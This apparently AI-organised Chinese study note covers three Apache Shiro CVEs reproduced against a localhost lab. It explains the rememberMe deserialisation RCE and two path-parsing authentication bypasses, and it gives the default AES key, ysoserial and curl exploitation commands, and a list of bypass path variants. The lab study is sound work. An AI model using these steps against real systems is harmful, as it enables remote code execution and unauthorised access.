# Apache Shiro 漏洞专题 — AI 详解版

> 本笔记为 AI 整理版，与手写版互补。手写版记操作，本版记原理与坑。
> 2026-08-15 实战打通：CVE-2016-4437（RCE）+ CVE-2020-1957（绕过）+ CVE-2010-3863（绕过）3/3 全通。

## 一、Shiro 是什么

Apache Shiro = Java 的**安全框架**（认证/授权/会话管理）——很多 Java Web 应用用它做"登录鉴权"。

**类比**：Shiro = 大楼的**门禁系统**（谁能不能进、进哪层）；Spring = 大楼的**房间导航**（请求路由到哪）。

**Shiro 的经典组件**：rememberMe（记住我）功能——把"用户身份"加密存进 Cookie。

## 二、CVE-2016-4437（Shiro-550）：rememberMe 反序列化 RCE

### 漏洞原理（为什么能 RCE）

Shiro 1.2.4 及以前：
1. **rememberMe Cookie** = AES 加密后的 Java 序列化对象（用户身份）
2. **AES 密钥硬编码在源码里**：`kPH+bIxk5D2deZiIxcaaaA==`（默认密钥，人人知道！）
3. 攻击者：用**默认密钥**伪造 Cookie → 塞入 ysoserial 反序列化 payload → 目标解密 → **反序列化执行** → RCE

**类比**：Shiro 把"用户身份"装进**加密信封**（rememberMe）——但**锁的钥匙（密钥）是出厂配好的、人人知道**——你伪造信封（塞反序列化炸弹）→ 目标拆信（解密）→ 炸弹炸（RCE）。

### 关键细节（Cookie 加密格式）

```
rememberMe = base64( 随机16字节IV + AES-CBC密文 )
密钥 key   = base64解码("kPH+bIxk5D2deZiIxcaaaA==")（16字节）
填充       = PKCS7
```

### 利用链（4 步）

```bash
# ① ysoserial 生成 payload（CommonsBeanutils1 适配 Shiro 的 classpath）
java -jar ysoserial2.jar CommonsBeanutils1 "touch /tmp/success" > poc.ser

# ② AES 加密（默认密钥 + IV 前置格式）
python3 shiro_encrypt.py poc.ser   # → 输出 rememberMe cookie 值

# ③ 发送 Cookie
curl -H "Cookie: rememberMe=<密文>" http://localhost:18080/

# ④ 目标解密 → 反序列化 → 命令执行（root）✅
```

### 实战要点

- **密钥探测**：实战中不知道密钥 → 用 shiro_attack 等工具**批量测常用密钥**（默认密钥/弱密钥库）
- **gadget 选择**：CommonsBeanutils1 通用（Shiro 依赖 commons-beanutils）；也可试 CC 链
- **反序列化无回显** → 用 dnslog/文件验证（副作用判断——老规矩）

## 三、CVE-2020-1957：认证绕过（Shiro 1.5.1）

### 漏洞原理（为什么能绕过）

Shiro 1.5.1 + Spring 的**路径解析差异**：

```
Shiro（门卫）:  /xxx/..;/admin/ → 有 "..;" 看不懂 → 不匹配受保护的 /admin/** → 放行 ✅
Spring（导航）:  /xxx/..;/admin/ → 规范化去掉 "..;" → 实际 = /admin/ → 路由到管理页 ✅
```

**同一个 URL，门卫（Shiro）和导航（Spring）解读不一致 = 绕过**。

**为什么 `..;` 是关键**：`;` 在 Tomcat 里是**路径参数分隔符**——Tomcat 把 `..;` 当"上一级目录+参数"规范化；Shiro 的匹配器不认识这个语法 → 不匹配受保护路径。

### 复现

```bash
curl "http://localhost:18080/admin/"            # 302 重定向登录（被拦）
curl "http://localhost:18080/xxx/..;/admin/"     # 200 绕过成功 ✅
```

## 四、CVE-2010-3863：认证绕过（Shiro 1.0.0 老版本）

### 漏洞原理

Shiro 1.1.0 以前：**权限校验前不做 URL 标准化**：

```
/./admin → Shiro 匹配时 ≠ /admin（不认 "." 段）→ 放行
          Tomcat 解析 = /admin → 路由到管理页 ✅
```

### 复现（关键坑：curl 会规范化路径！）

```bash
# ❌ 这样不行——curl 默认把 /./admin 规范化成 /admin 发送
curl "http://localhost:18080/./admin"            # 302

# ✅ 必须 --path-as-is 保持路径原样（或 Burp 原样发送）
curl --path-as-is "http://localhost:18080/./admin"   # 200 ✅
```

## 五、三个漏洞对比（版本 → payload 适配）

| 漏洞 | Shiro 版本 | 类型 | 有效 payload |
|---|---|---|---|
| CVE-2016-4437 | ≤1.2.4 | 反序列化 RCE | 默认密钥 AES 加密 rememberMe |
| CVE-2010-3863 | ≤1.1.0 | 认证绕过 | `/./admin`、`//admin`（未标准化段） |
| CVE-2020-1957 | <1.5.2 | 认证绕过 | `/xxx/..;/admin/`（`..;` 分号技巧） |

**核心规律**：绕过类漏洞 = **找 Shiro 与 Web 容器（Tomcat/Spring）的解析差异**——版本修复一个，就换下一个变体（`.`, `..;`, `;`, `//`, `%2f`...）。

## 六、实战方法论（路径绕过通用）

1. **识别 Shiro**：响应头 `rememberMe=deleteMe`（访问后服务器回这个 Cookie = Shiro 应用）
2. **探测版本**：不同版本吃不同 payload
3. **批量试变体**：
```
/admin  /./admin  //admin  /admin/  /..;/admin  /;/admin  /admin%2f  /admin?x
```
4. 哪个 200 用哪个（**Burp 或 curl --path-as-is 原样发送**）

## 七、工具清单

- `~/Desktop/tools/shiro_encrypt.py` — rememberMe Cookie 加密器（默认密钥，IV 前置格式）
- `~/Desktop/tools/ysoserial/ysoserial2.jar` — 反序列化 payload 生成
- 实战扩展：shiro_attack（密钥爆破+利用一体化工具）

## 八、一句话总结

> **Shiro 三大坑**：① rememberMe 密钥硬编码 → 伪造 Cookie 反序列化 RCE；② 路径匹配和容器解析不一致 → 认证绕过；③ 版本修复一个绕法 → 换一个变体继续绕。
> **核心思维**：任何"加密/匹配"组件，**默认值/实现差异**就是突破口——密钥是不是硬编码？路径解析和别的组件一不一致？
